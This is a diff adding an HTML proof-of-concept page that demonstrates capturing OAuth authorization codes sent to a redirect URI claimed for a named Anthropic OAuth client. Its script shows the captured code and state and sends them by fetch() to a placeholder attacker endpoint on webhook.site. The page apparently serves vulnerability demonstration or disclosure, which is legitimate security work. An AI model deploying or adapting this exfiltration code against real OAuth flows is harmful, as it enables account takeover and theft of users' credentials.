@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>excel.claude.ai - Claude OAuth Capture PoC</title></head>
+<body>
+<h1>Excel.claude.ai - PoC OAuth Code Capture</h1>
+<div id="result"></div>
+<script>
+var params = new URLSearchParams(window.location.search);
+var code = params.get('code');
+var state = params.get('state');
+var result = document.getElementById('result');
+
+if (code) {
+    result.innerHTML = '<h2 style="color:red">CAPTURED OAuth Authorization Code!</h2>' +
+        '<p><strong>code:</strong> ' + code + '</p>' +
+        '<p><strong>state:</strong> ' + (state || 'none') + '</p>' +
+        '<p><strong>timestamp:</strong> ' + new Date().toISOString() + '</p>';
+
+    // In a real attack, POST to attacker's server
+    fetch('https://webhook.site/ATTACKER_ENDPOINT?code=' + code + '&state=' + (state||'') + '&ts=' + Date.now());
+} else {
+    result.innerHTML = '<p>No code in URL. Visit with ?code=AUTH_CODE&state=... to simulate capture.</p>' +
+        '<p>This page is configured as the redirect_uri for Anthropic OAuth client 966eba67-8b8c-4eae-bbb3-08361d1b9292</p>';
+}
+</script>
+</body>
+</html>
